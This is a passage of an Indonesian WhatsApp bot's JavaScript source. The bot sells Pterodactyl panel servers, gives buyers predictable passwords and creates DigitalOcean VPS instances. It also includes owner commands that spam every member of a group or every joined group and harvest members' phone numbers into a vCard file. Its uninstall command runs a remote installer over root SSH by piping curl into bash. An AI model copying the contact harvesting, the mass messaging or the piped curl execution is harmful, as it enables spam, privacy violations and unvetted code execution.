            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(5000), db_saldo);
}
break;


case "buysrv7gb": {
    if (cekSaldo(sender, db_saldo) < 7000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 7.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "7GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "7168"; // Memory
    let cpu = "190";   // CPU
    let disk = "7168"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(7000), db_saldo);
}
break;


case "buysrv6gb": {
    if (cekSaldo(sender, db_saldo) < 6000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 6.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "6GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "6144"; // Memory
    let cpu = "160";   // CPU
    let disk = "6144"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(6000), db_saldo);
}
break;


case "buysrvunli": {
    if (cekSaldo(sender, db_saldo) < 10000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 10.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "UNLI";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "0"; // Unlimited memory
    let cpu = "0"; // Unlimited CPU
    let disk = "0"; // Unlimited Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(10000), db_saldo);
}
break;


case "buysrv1gb": {
    if (cekSaldo(sender, db_saldo) < 1000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 1.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "1GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "1024";
    let cpu = "30";
    let disk = "1024";
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(1000), db_saldo);
}
break;


case "pushkontak2": {
    if (!isOwner) return m.reply(`Onii-chan, *hanya pemilik yang bisa melakukan ini!*`);

    if (!text) return m.reply(`*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup`);

    if (!text.split("|")) return m.reply(`*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup`);

    var idnya = text.split("|")[0];
    var delay = Number(text.split("|")[1]);
    var teks = text.split("|")[2];

    if (!idnya.endsWith("@g.us")) return m.reply(`Onii-chan, *Format ID Grup Tidak Valid!*`);
    if (isNaN(delay)) return m.reply(`Onii-chan, *Format Delay Tidak Valid!*`);
    if (!teks) return m.reply(`*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup`);

    let groupMetadataa;
    try {
        groupMetadataa = await tamzz.groupMetadata(`${idnya}`);
    } catch (e) {
        return m.reply(`Onii-chan, *ID Grup tidak valid!*`);
    }

    const participants = await groupMetadataa.participants;
    const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);

    m.reply(`✨ Onii-chan, *Memproses Mengirim Pesan Ke ${halls.length} Member Grup...* ✨`);

    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
            await tamzz.sendMessage(mem, { text: teks }, { quoted: qpayment });
            await sleep(Number(delay));
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                ""
            ].join("\n");
            return vcard;
        }).join("");

        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply(`Onii-chan, *Terjadi kesalahan:* ${err.toString()}`);
    } finally {
        if (m.chat !== m.sender) {
            await m.reply(`✨ Onii-chan, *Berhasil Mengirim Pesan Ke ${halls.length} Member Grup!* ✨\nFile Contact Berhasil Dikirim ke Private Chat`);
        }
        
        await tamzz.sendMessage(m.sender, {
            document: fs.readFileSync("./all/database/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File Contact Berhasil Di Buat ✅",
            mimetype: "text/vcard",
        }, { quoted: qpayment });

        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;


case "pushkontak": {
    if (!isOwner) return m.reply(`Onii-chan, *hanya pemilik yang bisa melakukan ini!*`);

    if (!isGroup) return m.reply(`Onii-chan, *Perintah ini hanya dapat digunakan di grup!*`);
    
    if (!text) return m.reply(`Onii-chan, *Tolong masukkan pesannya!*`);

    let tamz = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    m.reply(`✨ Onii-chan, *Memproses Mengirim Pesan Ke ${tamz.length} Member Grup...* ✨`);

    for (let i of tamz) {
        var teks = text;
        tamzz.sendMessage(i, {
            text: text,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `ϝαԃȥʋρɳ`,
                    body: namaCreator,
                    thumbnailUrl: "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg",
                    sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
        
        if (i !== m.sender) {
            contacts.push(i);
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
            await tamzz.sendMessage(i, { text: teks }, { quoted: kalgans });
            await sleep(global.delaypushkontak);
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                ""
            ].join("\n");
            return vcard;
        }).join("");

        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply(`Onii-chan, *Terjadi kesalahan:* ${err.toString()}`);
    } finally {
        if (m.chat !== m.sender) {
            await m.reply(`✨ Onii-chan, *Berhasil Mengirim Pesan Ke ${tamz.length} Member Grup!* ✨\nFile Contact Berhasil Dikirim ke Private Chat`);
        }
        
        await tamzz.sendMessage(m.sender, {
            document: fs.readFileSync("./all/database/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File Contact Berhasil Di Buat ✅",
            mimetype: "text/vcard",
        }, { quoted: qpayment });
        
        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;

case 'uninstallpanel': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        reply(`✨ *PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK* ✨`);
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                isSuccess = true; // Menandai bahwa proses berhasil
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('6\n');
                    } else if (data.toString().includes('y/n')) {
                        stream.write('y\n');
                    } else {
                        stream.write('\n');
                    }
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    await new Promise(resolve => setTimeout(resolve, 20000));

    if (isSuccess) {
        reply(`✨ *SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK* ✨`);
    } else {
        reply(`Onii-chan, *Proses uninstall panel gagal!* 😔`);
    }
}
break;

case "teksjpm": {
if (!isOwner) return m.reply(mess.only.owner)
m.reply(fs.readFileSync("./all/database/teksjpm.js").toString())
}
break


case 'saldo': {
    reply(`*━━ CHECK YOUR INFO ━━*\n\n` +
          `_• *Name:* ${cekUser("name", sender)}_\n` +
          `_• *Resi:* ${cekUser("resi", sender)}_\n` +
          `_• *Nomer:* ${sender.split('@')[0]}_\n` +
          `_• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_\n\n` +
          `✨ Untuk menambah Saldo ketik #deposit ✨\n\n` +
          `*Note:* \n` +
          `_Saldo hanya bisa untuk beli panel._\n` +
          `_Tidak bisa ditarik atau transfer!_`);
}
break;


case "jpm2": {
    if (!isOwner) return m.reply(`Onii-chan, *hanya pemilik yang bisa melakukan ini!*`);

    if (!text) return m.reply(`Onii-chan, *Teksnya harus dikirim dengan membalas atau mengirim foto!*`);
    if (!/image/.test(mime)) return m.reply(`Onii-chan, *Teksnya harus dikirim dengan membalas atau mengirim foto!*`);

    let image = await tamzz.downloadAndSaveMediaMessage(qmsg);
    let total = 0;
    let getGroups = await tamzz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);

    m.reply(`Onii-chan, *Memproses Mengirim Pesan Teks & Foto Ke ${usergc.length} Grup*...`);

    for (let jid of usergc) {
        try {
            tamzz.sendMessage(jid, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true
                }
            }, { quoted: qpayment });
            total += 1;
        } catch (err) {
            console.error(err); // Menangani kesalahan yang mungkin terjadi
        }
        await sleep(global.delayjpm);
    }

    await fs.unlinkSync(image);
    m.reply(`✨ Onii-chan, *Berhasil Mengirim Postingan Ke ${total} Grup* ✨`);
}
break;


case 'vps1g1c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'sgp1',
            size: 's-1vcpu-1gb',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            // Memeriksa apakah ada alamat IP VPS yang tersedia
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ *VPS berhasil dibuat √* ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n\n`;
            messageText += `✨ *SPEKTIFIKASI* ✨\n\n`;
            messageText += `HOSTNAME: ${hostname}\n`;
            messageText += `REGION: sgp1\n`; // Ganti dengan variabel yang tepat jika ada
            messageText += `RAM: 1GB\n`; // Ganti dengan variabel yang tepat jika ada
            messageText += `OS + VERSI: Ubuntu 20.04\n`; // Ganti dengan variabel yang tepat jika ada

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
            return new Error(`Onii-chan, *Gagal membuat VPS:* ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;

case 'vps2g1c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'sgp1',
            size: 's-1vcpu-2gb',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            // Memeriksa apakah ada alamat IP VPS yang tersedia
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ VPS berhasil dibuat! ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
            return new Error(`Onii-chan, *Gagal membuat VPS:* ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;
 
case 'vps2g2c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'sgp1',
            size: 's-2vcpu-2gb',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            // Memeriksa apakah ada alamat IP VPS yang tersedia
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ VPS berhasil dibuat! ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
